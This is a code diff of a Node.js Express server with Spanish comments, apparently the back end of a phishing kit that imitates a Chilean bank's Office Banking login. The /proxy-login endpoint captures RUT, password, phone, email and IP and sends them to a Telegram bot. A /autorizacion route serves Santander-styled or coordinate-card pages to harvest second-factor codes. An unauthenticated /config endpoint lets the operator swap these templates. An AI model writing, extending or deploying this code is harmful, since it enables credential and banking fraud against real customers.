@@ -1,79 +1,96 @@
 const express = require("express");
-const fetch = require("node-fetch");
 const cors = require("cors");
+const fs = require("fs");
+const path = require("path");
+// Si tu Node es <18, instala node-fetch y descomenta:
+// const fetch = require("node-fetch");
 
 const app = express();
-
-// Habilitar CORS
 app.use(cors());
-
-// Middleware para parsear JSON
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, "public")));
 
-// Credenciales desde variables de entorno en Render
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+// Endpoint para leer configuración
+app.get("/config", (req, res) => {
+  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+  res.json(cfg);
+});
 
-// Endpoint de login
-app.post("/login", async (req, res) => {
-  const { rut, passwd, telefono } = req.body;
+// Endpoint para guardar configuración
+app.post("/config", (req, res) => {
+  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
+  res.json(req.body);
+});
 
-  if (!telefono) {
-    return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
+// Ruta directa al admin (URL corta)
+app.get("/admin", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "admin.html"));
+});
+
+// Decidir qué página de autorización mostrar
+app.get("/autorizacion", (req, res) => {
+  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+
+  if (cfg.tipoAutorizacion === "santander") {
+    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
+    return;
   }
 
-  const mensaje = `Nuevo intento de login:
-RUT: ${rut}
-Contraseña: ${passwd}
-Teléfono: ${telefono}`;
+  if (cfg.tipoAutorizacion === "coordenadas") {
+    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
+    return;
+  }
 
+  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
+});
+
+// Endpoint para recibir autorizaciones y reenviar a Telegram
+app.post("/autorizar", async (req, res) => {
+  const mensaje = req.body.mensaje || "Autorización recibida";
   try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
+      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    const data = await response.json();
-    console.log("Telegram API response:", data);
-
-    if (data.ok) {
-      res.send("✅ Hemos recibido tu solicitud.");
-    } else {
-      res.status(500).send(`❌ Error: ${data.description}`);
-    }
-  } catch (error) {
-    console.error("Error enviando a Telegram:", error);
-    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
+    // ✅ Mensaje diferenciado
+    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
+  } catch (err) {
+    res.status(500).json({ status: "error", error: err.message });
   }
 });
 
-// Endpoint de prueba para Telegram
-app.get("/test-telegram", async (req, res) => {
+// Endpoint para login → enviar credenciales o correo a Telegram
+app.post("/proxy-login", async (req, res) => {
+  const { rut, passwd, telefono, mail } = req.body;
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  let mensaje;
+
+ if (mail) {
+  mensaje = `Correo actualizado:\n${mail || "(sin correo)"}\nIP: ${ip}`;
+} else {
+  mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}\nIP: ${ip}`;
+}
+
   try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: "🚀 Prueba de conexión desde Render (login-ob-902p)" })
+      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    const data = await response.json();
-    console.log("Telegram API response:", data);
-
-    if (data.ok) {
-      res.send("✅ Mensaje de prueba enviado a Telegram.");
-    } else {
-      res.status(500).send(`❌ Error: ${data.description}`);
-    }
-  } catch (error) {
-    console.error("Error en test-telegram:", error);
-    res.status(500).send("❌ No se pudo enviar el mensaje de prueba.");
+    // ✅ Mensaje diferenciado
+    res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
+  } catch (err) {
+    res.status(500).json({ status: "error", error: err.message });
   }
 });
 
-// Iniciar servidor
+// Servir index.html por defecto
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Servidor corriendo en puerto ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
